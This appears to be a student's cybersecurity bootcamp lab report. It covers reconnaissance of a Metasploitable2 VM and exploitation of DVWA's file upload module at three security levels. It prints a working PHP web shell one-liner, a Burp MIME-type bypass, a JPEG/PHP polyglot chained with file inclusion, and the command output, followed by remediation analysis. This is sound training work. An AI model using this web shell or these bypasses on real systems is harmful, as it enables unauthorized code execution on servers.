# S09 — Recon Workflow & File Upload Exploitation

**Student:** Muhammad Zain Nasir
**Program:** Digital Forensics & Cyber Security Bootcamp — PSEB-CYBER-ISB-02
**Trainer:** Waseem Abbas Khan
**Repo folder:** `s09-recon-and-upload`

**Target:** DVWA v1.0.7 on the bundled Metasploitable2 VM
**Target IP:** `192.168.206.130` (confirmed via `ifconfig` on the target — differs from
the handout's example IP of `192.168.50.129`; all commands below use the real,
confirmed address)
**Attacker machine:** Kali Linux (VM)

All screenshots referenced below are in `images/`, numbered in the order they
were taken.

---

## Part A — My Own Recon Workflow

I kept the handout's ten-step structure but made two deliberate changes,
justified below.

| # | Stage | Question answered | Tool(s) used | Output | Stopping condition |
|---|-------|--------------------|--------------|--------|---------------------|
| 1 | Host discovery | What's alive on my subnet? | `nmap -sn 192.168.206.0/24` | 4 live hosts incl. gateway, Kali, target, one unknown host | Once every responsive host on /24 is listed |
| 2 | Connectivity check | Is the target actually reachable from Kali? | `ping -c 3 $TARGET` | 0% packet loss | 3 successful replies |
| 3 | Full port scan | What services are exposed? | `nmap $TARGET` | 20 open ports (ftp, ssh, telnet, smtp, dns, http, rpcbind, samba, rexec family, rmiregistry, ingreslock, nfs, ccproxy-ftp, mysql, postgresql, vnc, X11, irc, ajp13, unknown-8180) | Scan completes; all ports classified open/closed |
| 4 | Web-port focus | Any alternate web/TLS listeners? | `nmap -p 80,8080,8081,443,8443,4443 $TARGET` | Only 80 open; all others (443, 4443, 8080, 8081, 8443) closed | All 6 ports classified |
| 5 | HTTP headers | What does the server reveal about itself? | `curl -I http://$TARGET` | Apache/2.2.8 (Ubuntu) DAV/2, PHP/5.2.4-2ubuntu5.10 — both outdated/EOL | Headers printed |
| 6 | Technology fingerprinting | What is it actually built with? | `whatweb -v $TARGET` | Confirms Apache 2.2.8, PHP 5.2.4, WebDAV v2 enabled, title "Metasploitable2 - Linux" | Structured summary returned |
| 7 | Directory brute force | What's reachable, and does login gate it? | `gobuster dir -u http://$TARGET/dvwa -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak` | Pre-login paths only (`login.php`, `about.php`, `robots.txt`, `README.txt`, `setup.php`); everything else 302-redirects to login | Wordlist exhausted (18,452/18,452) |
| 8 | Misconfig/vuln scan | What's outdated or misconfigured? | `nikto -h http://$TARGET/dvwa` | Directory indexing on `/config/` and `/docs/`, missing security headers, HTTP TRACE enabled, PHP Easter Egg disclosure, outdated Apache/PHP confirmed again | 8231 requests, scan completes |
| 9 | TLS posture | Is there a TLS service to assess? | `sslscan $TARGET:80` | No TLS listener on port 80 — correctly a non-finding, not a "secure" finding | Scan returns no protocol/cipher data |
| 10 | Subdomain enum / WAF detection | Not applicable to a bare internal IP | — | Skipped, documented below | N/A |

### Deviations from the session's ten steps (justified)

1. **Added an explicit host-discovery step (`nmap -sn`) before targeting the
   single IP.** The session workflow starts directly at the target; I added
   this because I first needed to confirm the target's real IP
   (`192.168.206.130`, not the handout's `192.168.50.129`) and see what else
   shared the subnet. This is a one-line addition that costs nothing and
   avoids accidentally scanning the wrong host.
2. **Skipped subdomain enumeration (step 3) and WAF detection (step 10) as
   written.** Both require a real domain name and/or a public internet
   target; `192.168.206.130` is a private IP with no DNS. Running
   `subfinder`/`wafw00f` against it would return nothing meaningful — not a
   failure of the tool, but the wrong tool for this kind of target. I
   documented this rather than faking results against an unrelated domain.
3. **`katana` and `ffuf` were skipped** after gobuster already produced a
   path inventory; running a second, overlapping directory/URL tool against
   an unauthenticated site that mostly 302s to `login.php` would have
   produced the same information at the cost of time. `nikto`/`sslscan` were
   prioritized instead because they test categories gobuster cannot
   (misconfiguration, TLS).

### Notable finding: unauthenticated recon is blind to the real attack surface

Gobuster (step 7) found almost nothing of the actual vulnerable application —
`/vulnerabilities/` and `/hackable/` never appeared, because DVWA requires a
login and every protected path 302-redirects to `login.php` for an
unauthenticated client. This is a legitimate and reportable limitation: an
external, unauthenticated scan of this application understates its real
attack surface. The actual vulnerability discovery and exploitation in Part B
below required an authenticated session throughout.

---

## Part B — DVWA File Upload, All Levels

**Important note on scope:** the installed DVWA is **v1.0.7** (confirmed in
the page footer — see `25-dvwa-security-high-confirmed.png`), which ships
only **Low / Medium / High** security levels. The **Impossible** level
described in the handout does not exist in this build
(`30-dvwa-security-dropdown-no-impossible.png` shows the full dropdown). This
is documented honestly rather than fabricated; see the substitute analysis
at the end of this section.

### Baseline (pre-exploitation)

- `11-dvwa-security-level-low.png` — security level confirmed Low
- `12-baseline-image-upload-success.png` — legitimate `.jpg` uploaded,
  success message names the storage path:
  `../../hackable/uploads/Logo_burpsuite.jpg`

### Low — unrestricted upload

| Step | Evidence |
|---|---|
| Built `shell.php` (`<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>`) | `14-shellphp-created-kali.png` |
| Uploaded with zero validation | `13-shellphp-upload-success-low.png` |
| `?cmd=id` → `uid=33(www-data) gid=33(www-data) groups=33(www-data)` | `15-shell-cmd-id.png` |
| `?cmd=whoami` → `www-data` | `16-shell-cmd-whoami.png` |
| `?cmd=hostname` → `metasploitable` | `17-shell-cmd-hostname.png` |
| `?cmd=ip a` → confirms `eth0` at `192.168.206.130/24` | `18-shell-cmd-ip-a.png` |

**Privilege level:** `www-data` (the Apache service account) — not root.
Severity is still critical (arbitrary command execution, full read access to
configuration files that typically contain database credentials), but the
actual privilege level obtained is stated accurately here rather than
overstated.

### Medium — client-supplied MIME type, bypassed via Burp

| Step | Evidence |
|---|---|
| Security level set to Medium | `20-dvwa-security-medium-confirmed.png` |
| Unmodified `shell.php` upload rejected: "Your image was not uploaded." | `19-medium-blocked-unmodified.png` |
| Burp intercepted the correct POST to `/vulnerabilities/upload/` | `21-burp-intercept-post-upload.png` |
| `Content-Type` edited from `application/x-php` to `image/jpeg` | `22-burp-contenttype-edited-to-jpeg.png` |
| Forwarded — upload succeeds; `?cmd=id` confirms `uid=33(www-data)` again | `23-medium-bypass-cmd-id-success.png` |

**Lesson:** the MIME type in a multipart upload is supplied by the client
and is trivially rewritten in an intercepting proxy before the server ever
sees it. Client-side/client-supplied validation is not validation.

### High — content/extension check, bypassed with a polyglot (plus a real-world chain)

| Step | Evidence |
|---|---|
| Generated a genuine JPEG, resized, appended PHP payload (`small.jpg`) | `24-polyglot-verified.png` — `file`/`identify` confirm it is still a valid 50×50 JPEG after the PHP was appended |
| Security level set to High | `25-dvwa-security-high-confirmed.png` |
| Uploaded `small.jpg` — accepted without renaming | `26-polyglot-upload-success-high.png` |
| Direct request `small.jpg?cmd=id` — **rendered as an image, did not execute** | `27-polyglot-direct-request-renders-as-image.png` |
| Pulled and reviewed the High-level source via "View Source" | `32-high-level-source-code.png` (level confirmed in `31-security-high-confirmed-before-source.png`) |
| Chained the upload with DVWA's own File Inclusion (LFI) module (level temporarily lowered to Low for that module, per `28-security-low-for-lfi-chain.png`) to force `include()` to parse the uploaded file as PHP | `29-lfi-chain-polyglot-executes-cmd-id.png` → `uid=33(www-data) gid=33(www-data) groups=33(www-data)` confirmed, mixed with raw JPEG header bytes from the `include()` output |

**Key finding, verified against source (`32-high-level-source-code.png`):**
the High-level check in this DVWA build is **weaker than the handout's
description**. It does *not* perform any content/magic-byte inspection. The
actual check is:
```php
if (($uploaded_ext == "jpg" || $uploaded_ext == "JPG" ||
     $uploaded_ext == "jpeg" || $uploaded_ext == "JPEG") &&
    ($uploaded_size < 100000)) { ... move_uploaded_file(...) ... }
```
This is a pure extension-and-size whitelist. It passed the polyglot because
the file was named `small.jpg` and was under the size limit — not because any
content check was defeated. The embedded PHP did **not** execute on a direct
request, because Apache only hands `.php`-extension files to the PHP
interpreter; a `.jpg` file is served as a static image regardless of what
bytes it contains.

This is an important, honest result: the upload module's own validation was
bypassed, but code execution still required a **second, independent
vulnerability** (DVWA's File Inclusion module) to actually `include()` the
file as PHP. This demonstrates defense-in-depth working *partially* — one
layer failed, a second layer briefly held, and only chaining two separate
weaknesses together produced working remote code execution. The "Impossible"
substitute analysis below builds on exactly this observation.

### Substitute "Impossible-equivalent" analysis (this build has no Impossible level)

Comparing the High-level source above against what a correct implementation
needs:

| Control | High (as implemented) | What's missing |
|---|---|---|
| Content validation | None — extension string match only | Should call `getimagesize()` or equivalent to confirm the file is genuinely an image |
| Filename handling | Uses the attacker-supplied name verbatim (`basename($_FILES['uploaded']['name'])`) | Should generate a random server-side filename so the stored file can't be requested by a predictable name |
| Storage location | Inside the web root (`hackable/uploads/`) | Should be outside the web root, or in a directory with execution explicitly denied (e.g., Apache `Options -ExecCGI`, no handler for any script type) |
| Serving behavior | Served directly, browser renders/executes based on content | Should be served with `Content-Disposition: attachment` |

The directory-execution-denial point is the one that matters most: it is the
single control that would have defeated **every** bypass demonstrated in
this report, including the polyglot and the LFI chain, because there would
be nothing for `include()` or the PHP interpreter to execute even if it were
reached.

---

## Summary of Confirmed Findings

1. Unrestricted upload at Low → immediate, unauthenticated-adjacent RCE as `www-data`.
2. Client-supplied Content-Type at Medium → trivially bypassed via proxy.
3. Extension/size whitelist at High (no real content check) → bypassed with a
   genuine polyglot; direct execution blocked by file-extension-based
   interpreter dispatch, but RCE achieved via a chained LFI vulnerability.
4. This DVWA build (v1.0.7) has no Impossible level; a substitute gap
   analysis against the High source was produced instead.
5. Outdated Apache (2.2.8) and PHP (5.2.4) confirmed across multiple tools
   (curl, whatweb, nikto) — both over a decade past end-of-life.
